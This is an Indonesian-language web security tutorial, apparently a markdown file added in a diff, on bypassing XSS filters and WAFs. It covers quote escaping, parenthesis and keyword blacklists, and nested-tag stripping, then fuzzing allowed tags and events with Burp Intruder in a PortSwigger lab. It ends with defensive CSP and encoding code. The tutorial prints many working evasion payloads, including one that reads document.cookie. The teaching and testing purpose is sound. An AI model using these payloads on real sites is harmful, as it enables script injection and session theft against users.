@@ -1,0 +1,336 @@
+# Cross-Site Scripting (XSS): Bypassing Single Quote, Advanced Filters, & Fuzzing dengan Burp Intruder
+
+Dalam pengujian keamanan web nyata (*penetration testing* dan *bug bounty*), kamu hampir tidak akan pernah menemukan aplikasi yang mengizinkan payload mentah `<script>alert(1)</script>` tanpa adanya filter.
+
+Sebagian besar aplikasi web modern menerapkan filter keamanan seperti:
+* Meng-escape tanda kutip tunggal (`'`) menjadi `\'`.
+* Memblokir tanda kurung buka-tutup (`()`).
+* Menghapus kata kunci tertentu (*blacklist*) seperti `<script>`, `onerror`, atau `alert`.
+* Menerapkan WAF (*Web Application Firewall*) yang memblokir tag HTML umum.
+
+Materi ini membahas secara lengkap teknik **Evasion & Bypassing** untuk menembus setiap lapisan pertahanan tersebut, referensi resmi **PortSwigger XSS Cheat Sheet**, hingga metode otomatisasi fuzzing menggunakan **Burp Suite Intruder**.
+
+---
+
+## 1. Matriks Evasion & Teknik Bypass XSS
+
+![XSS Filter Evasion Matrix](/images/xss-filter-bypassing-intruder.svg)
+
+---
+
+## 2. Bypassing Filter Tanda Kutip Tunggal (`'`)
+
+Konteks ini sering terjadi ketika data pengguna dimasukkan ke dalam variabel JavaScript di dalam kode HTML:
+
+```html
+<script>
+  var query = 'USER_INPUT';
+</script>
+```
+
+Berikut beberapa teknik untuk memutus (*breakout*) string tersebut ketika tanda kutip tunggal di-filter:
+
+---
+
+### Teknik 1: Netralisasi Backslash Escape (`\`)
+Jika server mengamankan tanda kutip dengan menambahkan karakter backslash (`'` diubah menjadi `\'`):
+
+#### Logika Eksploitasi:
+Kirimkan karakter backslash sebelum tanda kutip: `\`
+* Backend mengubah tanda kutip menjadi: `\'`
+* Karena kamu mengirim `\`, string di backend menjadi: `\\'`
+* **Akibatnya:** Karakter backslash pertama menetralkan (*escapes*) backslash kedua. Tanda kutip tunggal kembali menjadi tanda kutip aktif yang menutup string JavaScript!
+
+#### Payload Lengkap:
+```text
+\';alert(document.domain)//
+```
+
+*Kode yang ter-render di peramban:*
+```javascript
+var query = '\\';alert(document.domain)//';
+```
+*(Variabel `query` bernilai string `\` tunggal, lalu perintah `alert(document.domain)` langsung dieksekusi!).*
+
+---
+
+### Teknik 2: Menggunakan ES6 Template Literals (Backticks `` ` ``)
+Jika tanda kutip tunggal (`'`) dan ganda (`"`) dibersihkan atau di-encode, kamu dapat memanfaatkan tanda petik miring (*backticks*) standar JavaScript modern:
+
+```javascript
+alert`document.domain`
+location=`javascript:alert(1)`
+```
+
+---
+
+### Teknik 3: `String.fromCharCode()`
+Jika kamu perlu mengirim string teks di dalam JavaScript tanpa menggunakan tanda kutip sama sekali:
+
+```javascript
+// Memanggil alert('XSS') tanpa tanda kutip:
+alert(String.fromCharCode(88, 83, 83))
+```
+
+---
+
+### Teknik 4: Entitas HTML di Dalam Atribut HTML
+Jika input kamu berada di dalam atribut HTML (seperti `onclick="..."` atau `href="..."`), peramban akan **secara otomatis melakukan HTML Entity Decode sebelum mengeksekusi JavaScript**:
+
+```html
+<!-- Server meng-escape tanda kutip menjadi entitas HTML: -->
+<a href="#" onclick="trackUser('&apos;-alert(1)-&apos;')">Klik</a>
+```
+*(Peramban mengubah `&apos;` menjadi `'` secara internal sebelum engine JavaScript menjalankannya!).*
+
+---
+
+## 3. Advanced Filter Evasion: Menembus Filter Tanpa Tanda Kurung `()` & Blacklist Kata
+
+Jika WAF atau sanitizer memblokir tanda kurung buka-tutup `()` atau memblokir kata kunci tertentu:
+
+---
+
+### 1. Eksekusi Fungsi Tanpa Tanda Kurung `()`
+
+#### A. Tagged Template Literals
+JavaScript mengizinkan pemanggilan fungsi menggunakan backticks tanpa kurung:
+```javascript
+alert`1`
+```
+
+#### B. Error Event Throw Trick (`throw onerror=...`)
+Memanfaatkan objek global `onerror` yang otomatis menerima parameter saat terjadi error:
+```html
+<svg onload="throw onerror=alert,1">
+<img src=x onerror="window.onerror=eval;throw'=alert\x28document.domain\x29'">
+```
+
+#### C. Navigasi Objek `location`
+```javascript
+location=name
+location='javascript:alert%281%29'
+```
+
+---
+
+### 2. Bypass Blacklist Kata Kunci (`alert`, `document`, `cookie`)
+
+Jika WAF memblokir kata `alert` atau `document.cookie`:
+
+#### A. Objek Window Lookup & Konkatenasi String
+```javascript
+window['al' + 'ert'](window['doc' + 'ument']['coo' + 'kie'])
+```
+
+#### B. Regex Source Concatenation
+```javascript
+top[/al/.source + /ert/.source](1)
+```
+
+#### C. Dynamic Function Constructor & Base64
+```javascript
+// Mengeksekusi alert(1) yang di-encode Base64 (YWxlcnQoMSk=)
+Function(atob('YWxlcnQoMSk='))()
+```
+
+---
+
+## 4. Server-Side Filter Stripping Evasion
+
+Banyak pengembang pemula membuat filter dengan fungsi penggantian string sederhana (*string replace*) yang hanya menghapus pola berbahaya satu kali (*non-recursive stripping*):
+
+```javascript
+// ❌ KODE RENTAN BACKEND: Hanya menghapus kata <script> satu kali
+cleanInput = userInput.replace(/<script>/gi, '');
+```
+
+---
+
+### Teknik 1: Nested Tag Injection (Penyisipan Bersarang)
+Sisipkan tag terlarang di tengah-tengah tag yang sama:
+
+```html
+<scr<script>ipt>alert(1)</script>
+```
+* **Proses di Server:** Server menemukan `<script>` di bagian tengah lalu menghapusnya.
+* **Hasil:** Sisa huruf `<scr` dan `ipt>` bergabung kembali menjadi `<script>` yang utuh dan valid!
+
+---
+
+### Teknik 2: Nested Event Handler Injection
+```html
+<img ononerrorer=alert(1)>
+```
+* Jika server menghapus kata `onerror` satu kali, huruf `on` di awal dan `er` di akhir akan menyatu membentuk event handler `onerror` yang aktif!
+
+---
+
+### Teknik 3: Whitespace Bypass (Tanpa Spasi)
+Jika filter memblokir spasi (`%20`), gunakan pemisah alternatif yang didukung parser HTML:
+```html
+<img/src=x/onerror=alert(1)>
+<svg%09onload=alert(1)>
+<svg%0Aonload=alert(1)>
+<svg%0Conload=alert(1)>
+```
+
+---
+
+## 5. Extreme Filter Fuzzing dengan Burp Suite Intruder
+
+Ketika berhadapan dengan WAF ketat yang memblokir hampir semua tag HTML dan event handler standar (seperti lab **PortSwigger Web Security: Reflected XSS with extreme event handler filtering**), metode manual akan memakan waktu terlalu lama.
+
+Kita menggunakan **Burp Suite Intruder** untuk melakukan fuzzing sistematis:
+
+---
+
+### Tahap 1: Fuzzing Tag HTML yang Diizinkan (Allowed Tags)
+
+1. Tangkap request pencarian di Burp Suite lalu kirim ke **Intruder** (`Ctrl + I` / `Cmd + I`).
+2. Atur **Attack type** ke `Sniper`.
+3. Pasang posisi payload pada nama tag HTML:
+   ```http
+   GET /?search=<§tag§> HTTP/1.1
+   Host: target-lab.net
+   ```
+4. Masukkan daftar semua tag HTML standar ke tab **Payloads** (salin langsung dari *PortSwigger XSS Cheat Sheet*).
+5. **PENTING:** Hilangkan centang pada opsi **"URL-encode these characters"** di bagian bawah tab Payloads agar tag tidak diubah menjadi `%3C...%3E`.
+6. Klik **Start attack**.
+7. Urutkan hasil berdasarkan kolom **Status Code**:
+   * Kebanyakan tag akan merespons `400 Bad Request` atau `403 Forbidden` (diblokir WAF).
+   * Cari tag yang merespons **`200 OK`** (misalnya tag `<custom-tags>`, `<svg>`, `<details>`, atau `<animatetransform>`).
+
+---
+
+### Tahap 2: Fuzzing Event Handler yang Diizinkan (Allowed Events)
+
+Setelah menemukan tag yang lolos (misalnya `<animatetransform>` atau `<svg>`):
+
+1. Ubah posisi payload di Intruder untuk menguji semua event handler:
+   ```http
+   GET /?search=<animatetransform%20§event§=1> HTTP/1.1
+   Host: target-lab.net
+   ```
+2. Muat daftar 100+ event handler DOM (`onload`, `onerror`, `onbegin`, `onfocus`, `onanimationend`, dll.) ke daftar payload.
+3. Klik **Start attack**.
+4. Periksa respons status `200 OK` untuk menemukan event handler yang tidak masuk dalam blacklist WAF (misalnya event **`onbegin`**).
+
+---
+
+### Tahap 3: Konstruksi Payload Final
+
+Gabungkan tag yang lolos dan event handler yang diizinkan untuk membentuk payload akhir:
+
+```html
+<svg><animatetransform onbegin=alert(document.domain)>
+```
+
+Begitu request dikirimkan ke target, animasi SVG langsung dimulai dan memicu event `onbegin`, mengeksekusi pop-up `alert(document.domain)` seketika! 🎉
+
+---
+
+## 6. Referensi Resmi: PortSwigger XSS Cheat Sheet & Vektor Extreme
+
+> [!TIP]
+> **DATABASE RESMI XSS CHEAT SHEET:**
+> Buka tautan resmi berikut untuk mendapatkan seluruh database tag HTML, event handler, dan vektor bypass lintas peramban (Chrome, Firefox, Safari):
+> 👉 **[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)**
+>
+> **Fitur Khusus untuk Burp Intruder:**
+> * Klik tombol **"Copy tags to clipboard"** untuk menyalin semua tag HTML sekaligus.
+> * Klik tombol **"Copy events to clipboard"** untuk menyalin ratusan event handler DOM sekaligus.
+> * Langsung *paste* ke tab **Payloads** di Burp Intruder tanpa perlu mengetik manual!
+
+---
+
+### 6 Vektor Extreme XSS Paling Populer dari Cheat Sheet:
+
+Berikut adalah vektor-vektor unik yang sering kali lolos dari WAF konvensional karena menggunakan tag dan event non-standar:
+
+#### 1. Vektor `<details ontoggle>` (Auto-Execute dengan Atribut `open`)
+Tag `<details>` memiliki event `ontoggle` yang otomatis berjalan saat status terbuka berubah:
+```html
+<details ontoggle=alert(document.domain) open>
+```
+
+#### 2. Vektor Custom Element dengan `tabindex` & `autofocus`
+Jika semua tag HTML standar diblokir, kamu bisa mendefinisikan custom tag HTML sendiri:
+```html
+<custom-tags id=x tabindex=1 onfocus=alert(document.domain) autofocus>
+```
+
+#### 3. Vektor Animasi SVG (`<animatetransform onbegin>`)
+Banyak WAF memblokir tag `<img>` dan `<script>`, tetapi lupa memblokir elemen animasi SVG:
+```html
+<svg><animatetransform onbegin=alert(document.domain)>
+```
+
+#### 4. Vektor `<select autofocus onfocus>`
+```html
+<select autofocus onfocus=alert(document.domain)>
+```
+
+#### 5. Vektor `<marquee onstart>`
+Elemen marquee HTML legacy yang masih didukung peramban modern:
+```html
+<marquee onstart=alert(document.domain)>
+```
+
+#### 6. Vektor `<iframe>` dengan Event `onresize`
+```html
+<iframe src="https://target.com/?search=%22%3E%3Cbody%20onresize=alert(document.domain)%3E" onload=this.style.width='100px'></iframe>
+```
+
+---
+
+## 7. Bedah Kode Backend: Filter Rapuh vs Pertahanan Solid
+
+### ❌ Mengapa Filter Blacklist & Sanitasi Parsial Selalu Gagal
+```typescript
+// ❌ KODE SANGAT BERBAHAYA: Mengandalkan Blacklist Regex
+function naiveSanitize(input: string): string {
+  return input
+    .replace(/<script>/gi, "")      // Mudah ditembus nested tag <scr<script>ipt>
+    .replace(/'/g, "\\'")          // Mudah ditembus backslash neutralization \'
+    .replace(/alert/gi, "");        // Mudah ditembus window['al'+'ert']
+}
+```
+
+---
+
+### ✅ Pertahanan yang Kokoh (Context-Aware Encoding & Strict CSP)
+```typescript
+import express from "express";
+import helmet from "helmet";
+
+const app = express();
+
+// 1. Terapkan Content Security Policy (CSP) ketat via Helmet
+app.use(
+  helmet.contentSecurityPolicy({
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"], // Melarang inline script & eval()
+      objectSrc: ["'none'"],
+      upgradeInsecureRequests: [],
+    },
+  })
+);
+
+// 2. Lakukan Context-Aware Encoding yang Tepat
+function encodeForHtmlAttribute(input: string): string {
+  return input.replace(/[^a-zA-Z0-9]/g, (char) => {
+    return "&#" + char.charCodeAt(0) + ";";
+  });
+}
+```
+
+---
+
+## 8. Ringkasan Prinsip Evasion
+
+1. **Kenali Karakter yang Di-escape:** Jika tanda kutip di-escape dengan `\`, selalu uji backslash neutralization `\'`.
+2. **Gunakan Alternatif Sintaksis JavaScript:** Manfaatkan backticks (`` ` ``), `String.fromCharCode`, dan template literals saat kurung atau kutip dilarang.
+3. **Manfaatkan PortSwigger Cheat Sheet & Burp Intruder:** Jangan menebak tag/event satu per satu; gunakan wordlist cheat sheet untuk menemukan celah yang terlewat oleh WAF.
+4. **Pertahanan Terbaik Bukan Blacklist:** WAF dan regex blacklist selalu bisa di-bypass. Gunakan **Context-Aware Output Encoding** dan **Content Security Policy (CSP)** yang ketat.
